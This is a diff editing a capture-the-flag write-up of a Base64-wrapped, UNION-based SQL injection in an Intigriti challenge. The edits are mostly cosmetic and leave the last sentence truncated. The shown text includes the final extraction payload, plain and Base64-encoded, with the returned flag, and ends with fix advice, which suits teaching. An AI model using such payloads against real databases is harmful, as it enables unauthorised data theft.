@@ -224,7 +224,7 @@ So `secret_vault` had two columns: `id` and `note`.
 
 ---
 
-## 🖼️ Step 8 — Open the Drawer and Grab the Flag 🏁
+## Step 8 — Open the Drawer and Grab the Flag 🏁
 
 Finally, the moment of truth. I asked the database to show me both columns together.
 
@@ -232,7 +232,12 @@ Plain-text payload:
 
 ```sql
 1' UNION SELECT CONCAT(id,':',note)
-FROM secret_vault#
+FROM secret_vault#  
+```
+Base64 Encoded payload:
+
+```
+MScgVU5JT04gU0VMRUNUIENPTkNBVChpZCwnOicsbm90ZSkKRlJPTSBzZWNyZXRfdmF1bHQjICAg
 ```
 
 **What's `CONCAT`?** It just glues two pieces of text together, like taping two puzzle pieces side by side so you can read them in one line.
@@ -243,17 +248,19 @@ Response:
 1:INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
 ```
 
-🎉 **Flag captured:**
+**Flag captured:**
 
 ```
 INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
 ```
 
-**📸 [Insert screenshot here: encoded payload for the final extraction and the response showing the flag]**
+**8.1: Encoded payload for the final extraction and the response showing the flag**
+![Encoded payload for the final extraction](image_file/11.jpg)
+
 
 ---
 
-## 📝 Short Summary (For Anyone in a Hurry)
+## Short Summary
 
 | Step | Action | Result |
 |------|--------|--------|
@@ -264,11 +271,11 @@ INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
 | 5 | Injected `UNION SELECT database()` | Found DB name `critter_gallery` |
 | 6 | Enumerated tables | Found `animals`, `secret_vault` |
 | 7 | Enumerated columns of `secret_vault` | Found `id`, `note` |
-| 8 | Extracted data with `CONCAT()` | 🏁 Got the flag |
+| 8 | Extracted data with `CONCAT()` | Got the flag |
 
 ---
 
-## ⚠️ Impact
+## Impact
 
 - **Confidentiality:** An attacker could read *any* data in the database — user info, secrets, internal records — with nothing more than a browser and a Base64 encoder.
 - **Integrity:** Depending on database permissions, an attacker might even be able to modify or delete data.
@@ -277,9 +284,7 @@ INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
 
 ---
 
-## 🛡️ How This Type of Bug Is Usually Fixed
-
-*(General advice — not specific to Intigriti's own remediation, included here for educational completeness.)*
+##  How This Type of Bug Is Usually Fixed
 
 - Use **parameterized queries / prepared statements** instead of building SQL by gluing strings together.
 - Never trust user input just because it's encoded (Base64 is *not* a security control — it's just a text format).
@@ -288,15 +293,11 @@ INTIGRITI{01a09f56-74a2-700b-a849-ffe6742327b2}
 
 ---
 
-## 🙌 Final Notes
+## Final Notes
 
 This was a fun challenge because it combined two layers of thinking:
 
 1. Recognizing the Base64 encoding trick.
 2. Applying classic UNION-based SQL Injection once the encoding was understood.
 
-Hopefully this write-up makes the technique clear enough that even a total beginner — or a sharp 10-year-old — could follow along step by step. 😄
-
----
-
-*Written as an educational walkthrough of an accepted Intigriti challenge report. Replace all `📸 [Insert screenshot here]` placeholders with your own images before publishing.*
+Hopefully this write-up makes the technique clear enough that even a total beginner.
